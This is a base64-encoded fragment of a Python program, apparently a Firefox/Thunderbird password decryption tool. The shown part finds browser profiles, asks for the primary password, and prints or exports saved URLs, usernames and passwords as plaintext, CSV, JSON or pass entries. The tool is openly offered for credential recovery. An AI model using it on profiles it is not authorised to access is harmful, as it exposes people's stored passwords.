d29yZCddfSdcbiIKICAgICAgICAgICAgKQogICAgICAgICAgICBzeXMuc3Rkb3V0LndyaXRlKHJlY29yZCkKCgpjbGFzcyBKU09OT3V0cHV0Rm9ybWF0KE91dHB1dEZvcm1hdCk6CiAgICBkZWYgb3V0cHV0KHNlbGYpOgogICAgICAgIHN5cy5zdGRvdXQud3JpdGUoanNvbi5kdW1wcyhzZWxmLnB3c3RvcmUsIGluZGVudD0yKSkKICAgICAgICAjIEpzb24gZHVtcHMgZG9lc24ndCBhZGQgdGhlIGZpbmFsIG5ld2xpbmUKICAgICAgICBzeXMuc3Rkb3V0LndyaXRlKCJcbiIpCgoKY2xhc3MgQ1NWT3V0cHV0Rm9ybWF0KE91dHB1dEZvcm1hdCk6CiAgICBkZWYgX19pbml0X18oc2VsZiwgcHdzdG9yZTogUFdTdG9yZSwgY21kYXJnczogYXJncGFyc2UuTmFtZXNwYWNlKToKICAgICAgICBzdXBlcigpLl9faW5pdF9fKHB3c3RvcmUsIGNtZGFyZ3MpCiAgICAgICAgc2VsZi5kZWxpbWl0ZXIgPSBjbWRhcmdzLmNzdl9kZWxpbWl0ZXIKICAgICAgICBzZWxmLnF1b3RlY2hhciA9IGNtZGFyZ3MuY3N2X3F1b3RlY2hhcgogICAgICAgIHNlbGYuaGVhZGVyID0gY21kYXJncy5jc3ZfaGVhZGVyCgogICAgZGVmIG91dHB1dChzZWxmKToKICAgICAgICBjc3Zfd3JpdGVyID0gY3N2LkRpY3RXcml0ZXIoCiAgICAgICAgICAgIHN5cy5zdGRvdXQsCiAgICAgICAgICAgIGZpZWxkbmFtZXM9WyJ1cmwiLCAidXNlciIsICJwYXNzd29yZCJdLAogICAgICAgICAgICBsaW5ldGVybWluYXRvcj0iXG4iLAogICAgICAgICAgICBkZWxpbWl0ZXI9c2VsZi5kZWxpbWl0ZXIsCiAgICAgICAgICAgIHF1b3RlY2hhcj1zZWxmLnF1b3RlY2hhciwKICAgICAgICAgICAgcXVvdGluZz1jc3YuUVVPVEVfQUxMLAogICAgICAgICkKICAgICAgICBpZiBzZWxmLmhlYWRlcjoKICAgICAgICAgICAgY3N2X3dyaXRlci53cml0ZWhlYWRlcigpCgogICAgICAgIGZvciBvdXRwdXQgaW4gc2VsZi5wd3N0b3JlOgogICAgICAgICAgICBjc3Zfd3JpdGVyLndyaXRlcm93KG91dHB1dCkKCgpjbGFzcyBUYWJ1bGFyT3V0cHV0Rm9ybWF0KENTVk91dHB1dEZvcm1hdCk6CiAgICBkZWYgX19pbml0X18oc2VsZiwgcHdzdG9yZTogUFdTdG9yZSwgY21kYXJnczogYXJncGFyc2UuTmFtZXNwYWNlKToKICAgICAgICBzdXBlcigpLl9faW5pdF9fKHB3c3RvcmUsIGNtZGFyZ3MpCiAgICAgICAgc2VsZi5kZWxpbWl0ZXIgPSAiXHQiCiAgICAgICAgc2VsZi5xdW90ZWNoYXIgPSAiJyIKCgpjbGFzcyBQYXNzT3V0cHV0Rm9ybWF0KE91dHB1dEZvcm1hdCk6CiAgICBkZWYgX19pbml0X18oc2VsZiwgcHdzdG9yZTogUFdTdG9yZSwgY21kYXJnczogYXJncGFyc2UuTmFtZXNwYWNlKToKICAgICAgICBzdXBlcigpLl9faW5pdF9fKHB3c3RvcmUsIGNtZGFyZ3MpCiAgICAgICAgc2VsZi5wcmVmaXggPSBjbWRhcmdzLnBhc3NfcHJlZml4CiAgICAgICAgc2VsZi5jbWQgPSBjbWRhcmdzLnBhc3NfY21kCiAgICAgICAgc2VsZi51c2VybmFtZV9wcmVmaXggPSBjbWRhcmdzLnBhc3NfdXNlcm5hbWVfcHJlZml4CiAgICAgICAgc2VsZi5hbHdheXNfd2l0aF9sb2dpbiA9IGNtZGFyZ3MucGFzc19hbHdheXNfd2l0aF9sb2dpbgoKICAgIGRlZiBvdXRwdXQoc2VsZik6CiAgICAgICAgc2VsZi50ZXN0X3Bhc3NfY21kKCkKICAgICAgICBzZWxmLnByZXByb2Nlc3Nfb3V0cHV0cygpCiAgICAgICAgc2VsZi5leHBvcnQoKQoKICAgIGRlZiB0ZXN0X3Bhc3NfY21kKHNlbGYpIC0+IE5vbmU6CiAgICAgICAgIiIiQ2hlY2sgaWYgcGFzcyBmcm9tIHBhc3N3b3Jkc3RvcmUub3JnIGlzIGluc3RhbGxlZAogICAgICAgIElmIGl0IGlzIGluc3RhbGxlZCBidXQgbm90IGluaXRpYWxpemVkLCBpbml0aWFsaXplIGl0CiAgICAgICAgIiIiCiAgICAgICAgTE9HLmRlYnVnKCJUZXN0aW5nIGlmIHBhc3N3b3JkIHN0b3JlIGlzIGluc3RhbGxlZCBhbmQgY29uZmlndXJlZCIpCgogICAgICAgIHRyeToKICAgICAgICAgICAgcCA9IHJ1bihbc2VsZi5jbWQsICJscyJdLCBjYXB0dXJlX291dHB1dD1UcnVlLCB0ZXh0PVRydWUpCiAgICAgICAgZXhjZXB0IEZpbGVOb3RGb3VuZEVycm9yIGFzIGU6CiAgICAgICAgICAgIGlmIGUuZXJybm8gPT0gMjoKICAgICAgICAgICAgICAgIExPRy5lcnJvcigiUGFzc3dvcmQgc3RvcmUgaXMgbm90IGluc3RhbGxlZCBhbmQgZXhwb3J0aW5nIHdhcyByZXF1ZXN0ZWQiKQogICAgICAgICAgICAgICAgcmFpc2UgRXhpdChFeGl0LlBBU1NTVE9SRV9NSVNTSU5HKQogICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgTE9HLmVycm9yKCJVbmtub3duIGVycm9yIGhhcHBlbmVkLiIpCiAgICAgICAgICAgICAgICBMT0cuZXJyb3IoIkVycm9yIHdhcyAnJXMnIiwgZSkKICAgICAgICAgICAgICAgIHJhaXNlIEV4aXQoRXhpdC5VTktOT1dOX0VSUk9SKQoKICAgICAgICBMT0cuZGVidWcoInBhc3MgcmV0dXJuZWQ6XG5TdGRvdXQ6ICVzXG5TdGRlcnI6ICVzIiwgcC5zdGRvdXQsIHAuc3RkZXJyKQoKICAgICAgICBpZiBwLnJldHVybmNvZGUgIT0gMDoKICAgICAgICAgICAgaWYgJ1RyeSAicGFzcyBpbml0IicgaW4gcC5zdGRlcnI6CiAgICAgICAgICAgICAgICBMT0cuZXJyb3IoIlBhc3N3b3J
kIHN0b3JlIHdhcyBub3QgaW5pdGlhbGl6ZWQuIikKICAgICAgICAgICAgICAgIExPRy5lcnJvcigiSW5pdGlhbGl6ZSB0aGUgcGFzc3dvcmQgc3RvcmUgbWFudWFsbHkgYnkgdXNpbmcgJ3Bhc3MgaW5pdCciKQogICAgICAgICAgICAgICAgcmFpc2UgRXhpdChFeGl0LlBBU1NTVE9SRV9OT1RfSU5JVCkKICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgIExPRy5lcnJvcigiVW5rbm93biBlcnJvciBoYXBwZW5lZCB3aGVuIHJ1bm5pbmcgJ3Bhc3MnLiIpCiAgICAgICAgICAgICAgICBMT0cuZXJyb3IoIlN0ZG91dDogJXNcblN0ZGVycjogJXMiLCBwLnN0ZG91dCwgcC5zdGRlcnIpCiAgICAgICAgICAgICAgICByYWlzZSBFeGl0KEV4aXQuVU5LTk9XTl9FUlJPUikKCiAgICBkZWYgcHJlcHJvY2Vzc19vdXRwdXRzKHNlbGYpOgogICAgICAgICMgRm9ybWF0IG9mICJzZWxmLnRvX2V4cG9ydCIgc2hvdWxkIGJlOgogICAgICAgICMgICAgIHsiYWRkcmVzcyI6IHsibG9naW4iOiAicGFzc3dvcmQiLCAuLi59LCAuLi59CiAgICAgICAgc2VsZi50b19leHBvcnQ6IGRpY3Rbc3RyLCBkaWN0W3N0ciwgc3RyXV0gPSB7fQoKICAgICAgICBmb3IgcmVjb3JkIGluIHNlbGYucHdzdG9yZToKICAgICAgICAgICAgdXJsID0gcmVjb3JkWyJ1cmwiXQogICAgICAgICAgICB1c2VyID0gcmVjb3JkWyJ1c2VyIl0KICAgICAgICAgICAgcGFzc3cgPSByZWNvcmRbInBhc3N3b3JkIl0KCiAgICAgICAgICAgICMgS2VlcCB0cmFjayBvZiB3ZWItYWRkcmVzcywgdXNlcm5hbWUgYW5kIHBhc3N3b3JkcwogICAgICAgICAgICAjIElmIG1vcmUgdGhhbiBvbmUgdXNlcm5hbWUgZXhpc3RzIGZvciB0aGUgc2FtZSB3ZWItYWRkcmVzcwogICAgICAgICAgICAjIHRoZSB1c2VybmFtZSB3aWxsIGJlIHVzZWQgYXMgbmFtZSBvZiB0aGUgZmlsZQogICAgICAgICAgICBhZGRyZXNzID0gdXJscGFyc2UodXJsKQoKICAgICAgICAgICAgaWYgYWRkcmVzcy5uZXRsb2Mgbm90IGluIHNlbGYudG9fZXhwb3J0OgogICAgICAgICAgICAgICAgc2VsZi50b19leHBvcnRbYWRkcmVzcy5uZXRsb2NdID0ge3VzZXI6IHBhc3N3fQoKICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgIHNlbGYudG9fZXhwb3J0W2FkZHJlc3MubmV0bG9jXVt1c2VyXSA9IHBhc3N3CgogICAgZGVmIGV4cG9ydChzZWxmKToKICAgICAgICAiIiJFeHBvcnQgZ2l2ZW4gcGFzc3dvcmRzIHRvIHBhc3N3b3JkIHN0b3JlCgogICAgICAgIEZvcm1hdCBvZiAidG9fZXhwb3J0IiBzaG91bGQgYmU6CiAgICAgICAgICAgIHsiYWRkcmVzcyI6IHsibG9naW4iOiAicGFzc3dvcmQiLCAuLi59LCAuLi59CiAgICAgICAgIiIiCiAgICAgICAgTE9HLmluZm8oIkV4cG9ydGluZyBjcmVkZW50aWFscyB0byBwYXNzd29yZCBzdG9yZSIpCiAgICAgICAgaWYgc2VsZi5wcmVmaXg6CiAgICAgICAgICAgIHByZWZpeCA9IGYie3NlbGYucHJlZml4fS8iCiAgICAgICAgZWxzZToKICAgICAgICAgICAgcHJlZml4ID0gc2VsZi5wcmVmaXgKCiAgICAgICAgTE9HLmRlYnVnKCJVc2luZyBwYXNzIHByZWZpeCAnJXMnIiwgcHJlZml4KQoKICAgICAgICBmb3IgYWRkcmVzcyBpbiBzZWxmLnRvX2V4cG9ydDoKICAgICAgICAgICAgZm9yIHVzZXIsIHBhc3N3IGluIHNlbGYudG9fZXhwb3J0W2FkZHJlc3NdLml0ZW1zKCk6CiAgICAgICAgICAgICAgICAjIFdoZW4gbW9yZSB0aGFuIG9uZSBhY2NvdW50IGV4aXN0IGZvciB0aGUgc2FtZSBhZGRyZXNzLCBhZGQKICAgICAgICAgICAgICAgICMgdGhlIGxvZ2luIHRvIHRoZSBwYXNzd29yZCBpZGVudGlmaWVyCiAgICAgICAgICAgICAgICBpZiBzZWxmLmFsd2F5c193aXRoX2xvZ2luIG9yIGxlbihzZWxmLnRvX2V4cG9ydFthZGRyZXNzXSkgPiAxOgogICAgICAgICAgICAgICAgICAgIHBhc3NuYW1lID0gZiJ7cHJlZml4fXthZGRyZXNzfS97dXNlcn0iCiAgICAgICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgICAgIHBhc3NuYW1lID0gZiJ7cHJlZml4fXthZGRyZXNzfSIKCiAgICAgICAgICAgICAgICBMT0cuaW5mbygiRXhwb3J0aW5nIGNyZWRlbnRpYWxzIGZvciAnJXMnIiwgcGFzc25hbWUpCgogICAgICAgICAgICAgICAgZGF0YSA9IGYie3Bhc3N3fVxue3NlbGYudXNlcm5hbWVfcHJlZml4fXt1c2VyfVxuIgoKICAgICAgICAgICAgICAgIExPRy5kZWJ1ZygiSW5zZXJ0aW5nIHBhc3MgJyVzJyAnJXMnIiwgcGFzc25hbWUsIGRhdGEpCgogICAgICAgICAgICAgICAgIyBOT1RFIC0tZm9yY2UgaXMgdXNlZC4gRXhpc3RpbmcgcGFzc3dvcmRzIHdpbGwgYmUgb3ZlcndyaXR0ZW4KICAgICAgICAgICAgICAgIGNtZDogbGlzdFtzdHJdID0gWwogICAgICAgICAgICAgICAgICAgIHNlbGYuY21kLAogICAgICAgICAgICAgICAgICAgICJpbnNlcnQiLAogICAgICAgICAgICAgICAgICAgICItLWZvcmNlIiwKICAgICAgICAgICAgICAgICAgICAiLS1tdWx0aWxpbmUiLAogICAgICAgICAgICAgICAgICAgIHBhc3NuYW1lLAogICAgICAgICAgICAgICAgXQoKICAgICAgICAgICAgICAgIExPRy5kZWJ1ZygiUnVubmluZyBjb21tYW5kICclcycgd2l0aCBzdGRpbiAnJXMnIiwgY21kLCBkYXRhKQoKICAgICAgICAgICAgICAgIHAgPSBydW4oY21kLCBpbnB1dD1kYXRhLCBjYXB0dXJlX291dHB1dD1UcnVlLCB0ZXh0PVRydWUpCgogICAgICAgICAgICAgICAgaWYgcC5yZXR1cm5jb2RlICE9IDA6CiAgICAgICAgICAgICAgICAgICAgTE9HLmVycm9yKAogICAgICAgICAgICAgICAgICAgICAgICAiRVJST1I6IHBhc3N3b3Jkc3RvcmUgZXhpdGVkIHdpdGggbm9uLXplcm86ICVzIiwgcC5yZXR1cm5jb2RlCiAgICAgICAgICAgICAgICAgICAgKQogICAgICAgICAgICAgICAgICAgIExPRy5lcnJvcigiU3Rkb3V0OiAlc1xuU3RkZXJyOiAlcyIsIHAuc3Rkb3V0LCBwLnN0ZGVycikKICAgICAgICAgICAgICAgICAgICByYWlzZSBFeGl0KEV4aXQuUEFTU1NUT1JFX0VSUk9SKQoKICAgICAgICAgICAgICAgIExPRy5kZWJ1ZygiU3VjY2Vzc2Z1bGx5IGV4cG9ydGVkICclcyciLCBwYXNzbmFtZSkKCgpkZWYgZ2V0X3NlY3Rpb25zKHByb2ZpbGVzKToKICAgICIiIgogICAgUmV0dXJucyBoYXNoIG9mIHByb2ZpbGUgbnVtYmVycyBhbmQgcHJvZmlsZSBuYW1lcy4KICAgICIiIgogICAgc2VjdGlvbnMgPSB7fQogICAgaSA9IDEKICAgIGZvciBzZWN0aW9uIGluIHByb2ZpbGVzLnNlY3Rpb25zKCk6CiAgICAgICAgaWYgc2VjdGlvbi5zdGFydHN3aXRoKCJQcm9maWxlIik6CiAgICAgICAgICAgIHNlY3Rpb25zW3N0cihpKV0gPSBwcm9maWxlcy5nZXQoc2VjdGlvbiwgIlBhdGgiKQogICAgICAgICAgICBpICs9IDEKICAgICAgICBlbHNlOgogICAgICAgICAgICBjb250aW51ZQogICAgcmV0dXJuIHNlY3Rpb25zCgoKZGVmIHByaW50X3NlY3Rpb25zKHNlY3Rpb25zLCB0ZXh0SU9XcmFwcGVyPXN5cy5zdGRlcnIpOgogICAgIiIiCiAgICBQcmludHMgYWxsIGF2YWlsYWJsZSBzZWN0aW9ucyB0byBhbiB0ZXh0SU9XcmFwcGVyIChkZWZhdWx0cyB0byBzeXMuc3RkZXJyKQogICAgIiIiCiAgICBmb3IgaSBpbiBzb3J0ZWQoc2VjdGlvbnMpOgogICAgICAgIHRleHRJT1dyYXBwZXIud3JpdGUoZiJ7aX0gLT4ge3NlY3Rpb25zW2ldfVxuIikKICAgIHRleHRJT1dyYXBwZXIuZmx1c2goKQoKCmRlZiBhc2tfc2VjdGlvbihzZWN0aW9uczogQ29uZmlnUGFyc2VyKToKICAgICIiIgogICAgUHJvbXB0IHRoZSB1c2VyIHdoaWNoIHByb2ZpbGUgc2hvdWxkIGJlIHVzZWQgZm9yIGRlY3J5cHRpb24KICAgICIiIgogICAgIyBEbyBub3QgYXNrIGZvciBjaG9pY2UgaWYgdXNlciBhbHJlYWR5IGdhdmUgb25lCiAgICBjaG9pY2UgPSAiQVNLIgogICAgd2hpbGUgY2hvaWNlIG5vdCBpbiBzZWN0aW9uczoKICAgICAgICBzeXMuc3RkZXJyLndyaXRlKCJTZWxlY3QgdGhlIE1vemlsbGEgcHJvZmlsZSB5b3Ugd2lzaCB0byBkZWNyeXB0XG4iKQogICAgICAgIHByaW50X3NlY3Rpb25zKHNlY3Rpb25zKQogICAgICAgIHRyeToKICAgICAgICAgICAgY2hvaWNlID0gaW5wdXQoKQogICAgICAgIGV4Y2VwdCBFT0ZFcnJvcjoKICAgICAgICAgICAgTE9HLmVycm9yKCJDb3VsZCBub3QgcmVhZCBDaG9pY2UsIGdvdCBFT0YiKQogICAgICAgICAgICByYWlzZSBFeGl0KEV4aXQuUkVBRF9HT1RfRU9GKQoKICAgIHRyeToKICAgICAgICBmaW5hbF9jaG9pY2UgPSBzZWN0aW9uc1tjaG9pY2VdCiAgICBleGNlcHQgS2V5RXJyb3I6CiAgICAgICAgTE9HLmVycm9yKCJQcm9maWxlIE5vLiAlcyBkb2VzIG5vdCBleGlzdCEiLCBjaG9pY2UpCiAgICAgICAgcmFpc2UgRXhpdChFeGl0Lk5PX1NVQ0hfUFJPRklMRSkKCiAgICBMT0cuZGVidWcoIlByb2ZpbGUgc2VsZWN0aW9uIG1hdGNoZWQgJXMiLCBmaW5hbF9jaG9pY2UpCgogICAgcmV0dXJuIGZpbmFsX2Nob2ljZQoKCmRlZiBhc2tfcGFzc3dvcmQocHJvZmlsZTogc3RyLCBpbnRlcmFjdGl2ZTogYm9vbCkgLT4gc3RyOgogICAgIiIiCiAgICBQcm9tcHQgZm9yIHByb2ZpbGUgcGFzc3dvcmQKICAgICIiIgogICAgcGFzc3dkOiBzdHIKICAgIHBhc3Ntc2cgPSBmIlxuUHJpbWFyeSBQYXNzd29yZCBmb3IgcHJvZmlsZSB7cHJvZmlsZX06ICIKCiAgICBpZiBzeXMuc3RkaW4uaXNhdHR5KCkgYW5kIGludGVyYWN0aXZlOgogICAgICAgIHBhc3N3ZCA9IGdldHBhc3MocGFzc21zZykKICAgIGVsc2U6CiAgICAgICAgc3lzLnN0ZGVyci53cml0ZSgiUmVhZGluZyBQcmltYXJ5IHBhc3N3b3JkIGZyb20gc3RhbmRhcmQgaW5wdXQ6XG4iKQogICAgICAgIHN5cy5zdGRlcnIuZmx1c2goKQogICAgICAgICMgQWJpbGl0eSB0byByZWFkIHRoZSBwYXNzd29yZCBmcm9tIHN0ZGluIChlY2hvICJwYXNzIiB8IC4vZmlyZWZveF8uLi4pCiAgICAgICAgcGFzc3dkID0gc3lzLnN0ZGluLnJlYWRsaW5lKCkucnN0cmlwKCJcbiIpCgogICAgcmV0dXJuIHBhc3N3ZAoKCmRlZiByZWFkX3Byb2ZpbGVzKGJhc2VwYXRoKToKICAgICIiIgogICAgUGFyc2UgRmlyZWZveCBwcm9maWxlcyBpbiBwcm92aWRlZCBsb2NhdGlvbi4KICAgIElmIGxpc3RfcHJvZmlsZXMgaXMgdHJ1ZSwgd2lsbCBleGl0IGFmdGVyIGxpc3RpbmcgYXZhaWxhYmxlIHByb2ZpbGVzLgogICAgIiIiCiAgICBwcm9maWxlaW5pID0gb3MucGF0aC5qb2luKGJhc2VwYXRoLCAicHJvZmlsZXMuaW5pIikKCiAgICBMT0cuZGVidWcoIlJlYWRpbmcgcHJvZmlsZXMgZnJvbSAlcyIsIHByb2ZpbGVpbmkpCgogICAgaWYgbm90IG9zLnBhdGguaXNmaWxlKHByb2ZpbGVpbmkpOgogICAgICAgIExPRy53YXJuaW5nKCJwcm9maWxlLmluaSBub3QgZm91bmQgaW4gJXMiLCBiYXNlcGF0aCkKICAgICAgICByYWlzZSBFeGl0KEV4aXQuTUlTU0lOR19QUk9GSUxFSU5JKQoKICAgICMgUmVhZCBwcm9maWxlcyBmcm9tIEZpcmVmb3ggcHJvZmlsZSBmb2xkZXIKICAgIHByb2ZpbGVzID0gQ29uZmlnUGFyc2VyKCkKICAgIHByb2ZpbGVzLnJlYWQocHJvZmlsZWluaSwgZW5jb2Rpbmc9REVGQVVMVF9FTkNPRElORykKCiAgICBMT0cuZGVidWcoIlJlYWQgcHJvZmlsZXMgJXMiLCBwcm9maWxlcy5zZWN0aW9ucygpKQoKICAgIHJldHVybiBwcm9maWxlcwoKCmRlZiBnZXRfcHJvZmlsZSgKICAgIGJhc2VwYXRoOiBzdHIsIGludGVyYWN0aXZlOiBib29sLCBjaG9pY2U6IE9wdGlvbmFsW3N0cl0sIGxpc3RfcHJvZmlsZXM6IGJvb2wKKToKICAgICIiIgogICAgU2VsZWN0IHByb2ZpbGUgdG8gdXNlIGJ5IGVpdGhlciByZWFkaW5nIHByb2ZpbGVzLmluaSBvciBhc3N1bWluZyBnaXZlbgogICAgcGF0aCBpcyBhbHJlYWR5IGEgcHJvZmlsZQogICAgSWYgaW50ZXJhY3RpdmUgaXMgZmFsc2UsIHdpbGwgbm90IHRyeSB0byBhc2sgd2hpY2ggcHJvZmlsZSB0byBkZWNyeXB0LgogICAgY2hvaWNlIGNvbnRhaW5zIHRoZSBjaG9pY2UgdGhlIHVzZXIgZ2F2ZSB1cyBhcyBhbiBDTEkgYXJnLgogICAgSWYgbGlzdF9wcm9maWxlcyBpcyB0cnVlIHdpbGwgZXhpdHMgYWZ0ZXIgbGlzdGluZyBhbGwgYXZhaWxhYmxlIHByb2ZpbGVzLgogICAgIiIiCiAgICB0cnk6CiAgICAgICAgcHJvZmlsZXM6IENvbmZpZ1BhcnNlciA9IHJlYWRfcHJvZmlsZXMoYmFzZXBhdGgpCgogICAgZXhjZXB0IEV4aXQgYXMgZToKICAgICAgICBpZiBlLmV4aXRjb2RlID09IEV4aXQuTUlTU0lOR19QUk9GSUxFSU5JOgogICAgICAgICAgICBMT0cud2FybmluZygiQ29udGludWluZyBhbmQgYXNzdW1pbmcgJyVzJyBpcyBhIHByb2ZpbGUgbG9jYXRpb24iLCBiYXNlcGF0aCkKICAgICAgICAgICAgcHJvZmlsZSA9IGJhc2VwYXRoCgogICAgICAgICAgICBpZiBsaXN0X3Byb2ZpbGVzOgogICAgICAgICAgICAgICAgTE9HLmVycm9yKCJMaXN0aW5nIHNpbmdsZSBwcm9maWxlcyBub3QgcGVybWl0dGVkLiIpCiAgICAgICAgICAgICAgICByYWlzZQoKICAgICAgICAgICAgaWYgbm90IG9zLnBhdGguaXNkaXIocHJvZmlsZSk6CiAgICAgICAgICAgICAgICBMT0cuZXJyb3IoIlByb2ZpbGUgbG9jYXRpb24gJyVzJyBpcyBub3QgYSBkaXJlY3RvcnkiLCBwcm9maWxlKQogICAgICAgICAgICAgICAgcmFpc2UKICAgICAgICBlbHNlOgogICAgICAgICAgICByYWlzZQogICAgZWxzZToKICAgICAgICBpZiBsaXN0X3Byb2ZpbGVzOgogICAgICAgICAgICBMT0cuZGVidWcoIkxpc3RpbmcgYXZhaWxhYmxlIHByb2ZpbGVzLi4uIikKICAgICAgICAgICAgcHJpbnRfc2VjdGlvbnMoZ2V0X3NlY3Rpb25zKHByb2ZpbGVzKSwgc3lzLnN0ZG91dCkKICAgICAgICAgICAgcmFpc2UgRXhpdChFeGl0LkNMRUFOKQoKICAgICAgICBzZWN0aW9ucyA9IGdldF9zZWN0aW9ucyhwcm9maWxlcykKCiAgICAgICAgaWYgbGVuKHNlY3Rpb25zKSA9PSAxOgogICAgICAgICAgICBzZWN0aW9uID0gc2VjdGlvbnNbIjEiXQoKICAgICAgICBlbGlmIGNob2ljZSBpcyBub3QgTm9uZToKICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgc2VjdGlvbiA9IHNlY3Rpb25zW2Nob2ljZV0KICAgICAgICAgICAgZXhjZXB0IEtleUVycm9yOgogICAgICAgICAgICAgICAgTE9HLmVycm9yKCJQcm9maWxlIE5vLiAlcyBkb2VzIG5vdCBleGlzdCEiLCBjaG9pY2UpCiAgICAgICAgICAgICAgICByYWlzZSBFeGl0KEV4aXQuTk9fU1VDSF9QUk9GSUxFKQoKICAgICAgICBlbGlmIG5vdCBpbnRlcmFjdGl2ZToKICAgICAgICAgICAgTE9HLmVycm9yKAogICAgICAgICAgICAgICAgIkRvbid0IGtub3cgd2hpY2ggcHJvZmlsZSB0byBkZWNyeXB0LiAiCiAgICAgICAgICAgICAgICAiV2UgYXJlIGluIG5vbi1pbnRlcmFjdGl2ZSBtb2RlIGFuZCAtYy8tLWNob2ljZSB3YXNuJ3Qgc3BlY2lmaWVkLiIKICAgICAgICAgICAgKQogICAgICAgICAgICByYWlzZSBFeGl0KEV4aXQuTUlTU0lOR19DSE9JQ0UpCgogICAgICAgIGVsc2U6CiAgICAgICAgICAgICMgQXNrIHVzZXIgd2hpY2ggcHJvZmlsZSB0byBvcGVuCiAgICAgICAgICAgIHNlY3Rpb24gPSBhc2tfc2VjdGlvbihzZWN0aW9ucykKCiAgICAgICAgc2VjdGlvbiA9IHNlY3Rpb24KICAgICAgICBwcm
9maWxlID0gb3MucGF0aC5qb2luKGJhc2VwYXRoLCBzZWN0aW9uKQoKICAgICAgICBpZiBub3Qgb3MucGF0aC5pc2Rpcihwcm9maWxlKToKICAgICAgICAgICAgTE9HLmVycm9yKAogICAgICAgICAgICAgICAgIlByb2ZpbGUgbG9jYXRpb24gJyVzJyBpcyBub3QgYSBkaXJlY3RvcnkuIEhhcyBwcm9maWxlcy5pbmkgYmVlbiB0YW1wZXJlZCB3aXRoPyIsCiAgICAgICAgICAgICAgICBwcm9maWxlLAogICAgICAgICAgICApCiAgICAgICAgICAgIHJhaXNlIEV4aXQoRXhpdC5CQURfUFJPRklMRUlOSSkKCiAgICByZXR1cm4gcHJvZmlsZQoKCiMgRnJvbSBodHRwczovL2J1Z3MucHl0aG9uLm9yZy9tc2czMjM2ODEKY2xhc3MgQ29udmVydENob2ljZXMoYXJncGFyc2UuQWN0aW9uKToKICAgICIiIkFyZ3BhcnNlIGFjdGlvbiB0aGF0IGludGVycHJldHMgdGhlIGBjaG9pY2VzYCBhcmd1bWVudCBhcyBhIGRpY3QKICAgIG1hcHBpbmcgdGhlIHVzZXItc3BlY2lmaWVkIGNob2ljZXMgdmFsdWVzIHRvIHRoZSByZXN1bHRpbmcgb3B0aW9uCiAgICB2YWx1ZXMuCiAgICAiIiIKCiAgICBkZWYgX19pbml0X18oc2VsZiwgKmFyZ3MsIGNob2ljZXMsICoqa3dhcmdzKToKICAgICAgICBzdXBlcigpLl9faW5pdF9fKCphcmdzLCBjaG9pY2VzPWNob2ljZXMua2V5cygpLCAqKmt3YXJncykKICAgICAgICBzZWxmLm1hcHBpbmcgPSBjaG9pY2VzCgogICAgZGVmIF9fY2FsbF9fKHNlbGYsIHBhcnNlciwgbmFtZXNwYWNlLCB2YWx1ZSwgb3B0aW9uX3N0cmluZz1Ob25lKToKICAgICAgICBzZXRhdHRyKG5hbWVzcGFjZSwgc2VsZi5kZXN0LCBzZWxmLm1hcHBpbmdbdmFsdWVdKQoKCmRlZiBwYXJzZV9zeXNfYXJncygpIC0+IGFyZ3BhcnNlLk5hbWVzcGFjZToKICAgICIiIlBhcnNlIGNvbW1hbmQgbGluZSBhcmd1bWVudHMiIiIKCiAgICBpZiBTWVNURU0gPT0gIldpbmRvd3MiOgogICAgICAgIHByb2ZpbGVfcGF0aCA9IG9zLnBhdGguam9pbihvcy5lbnZpcm9uWyJBUFBEQVRBIl0sICJNb3ppbGxhIiwgIkZpcmVmb3giKQogICAgZWxpZiBvcy51bmFtZSgpWzBdID09ICJEYXJ3aW4iOgogICAgICAgIHByb2ZpbGVfcGF0aCA9ICJ+L0xpYnJhcnkvQXBwbGljYXRpb24gU3VwcG9ydC9GaXJlZm94IgogICAgZWxzZToKICAgICAgICBwcm9maWxlX3BhdGggPSAifi8ubW96aWxsYS9maXJlZm94IgoKICAgIHBhcnNlciA9IGFyZ3BhcnNlLkFyZ3VtZW50UGFyc2VyKAogICAgICAgIGRlc2NyaXB0aW9uPSJBY2Nlc3MgRmlyZWZveC9UaHVuZGVyYmlyZCBwcm9maWxlcyBhbmQgZGVjcnlwdCBleGlzdGluZyBwYXNzd29yZHMiCiAgICApCiAgICBwYXJzZXIuYWRkX2FyZ3VtZW50KAogICAgICAgICJwcm9maWxlIiwKICAgICAgICBuYXJncz0iPyIsCiAgICAgICAgZGVmYXVsdD1wcm9maWxlX3BhdGgsCiAgICAgICAgaGVscD1mIlBhdGggdG8gcHJvZmlsZSBmb2xkZXIgKGRlZmF1bHQ6IHtwcm9maWxlX3BhdGh9KSIsCiAgICApCgogICAgZm9ybWF0X2Nob2ljZXMgPSB7CiAgICAgICAgImh1bWFuIjogSHVtYW5PdXRwdXRGb3JtYXQsCiAgICAgICAgImpzb24iOiBKU09OT3V0cHV0Rm9ybWF0LAogICAgICAgICJjc3YiOiBDU1ZPdXRwdXRGb3JtYXQsCiAgICAgICAgInRhYnVsYXIiOiBUYWJ1bGFyT3V0cHV0Rm9ybWF0LAogICAgICAgICJwYXNzIjogUGFzc091dHB1dEZvcm1hdCwKICAgIH0KCiAgICBwYXJzZXIuYWRkX2FyZ3VtZW50KAogICAgICAgICItZiIsCiAgICAgICAgIi0tZm9ybWF0IiwKICAgICAgICBhY3Rpb249Q29udmVydENob2ljZXMsCiAgICAgICAgY2hvaWNlcz1mb3JtYXRfY2hvaWNlcywKICAgICAgICBkZWZhdWx0PUh1bWFuT3V0cHV0Rm9ybWF0LAogICAgICAgIGhlbHA9IkZvcm1hdCBmb3IgdGhlIG91dHB1dC4iLAogICAgKQogICAgcGFyc2VyLmFkZF9hcmd1bWVudCgKICAgICAgICAiLWQiLAogICAgICAgICItLWNzdi1kZWxpbWl0ZXIiLAogICAgICAgIGFjdGlvbj0ic3RvcmUiLAogICAgICAgIGRlZmF1bHQ9IjsiLAogICAgICAgIGhlbHA9IlRoZSBkZWxpbWl0ZXIgZm9yIGNzdiBvdXRwdXQiLAogICAgKQogICAgcGFyc2VyLmFkZF9hcmd1bWVudCgKICAgICAgICAiLXEiLAogICAgICAgICItLWNzdi1xdW90ZWNoYXIiLAogICAgICAgIGFjdGlvbj0ic3RvcmUiLAogICAgICAgIGRlZmF1bHQ9JyInLAogICAgICAgIGhlbHA9IlRoZSBxdW90ZSBjaGFyIGZvciBjc3Ygb3V0cHV0IiwKICAgICkKICAgIHBhcnNlci5hZG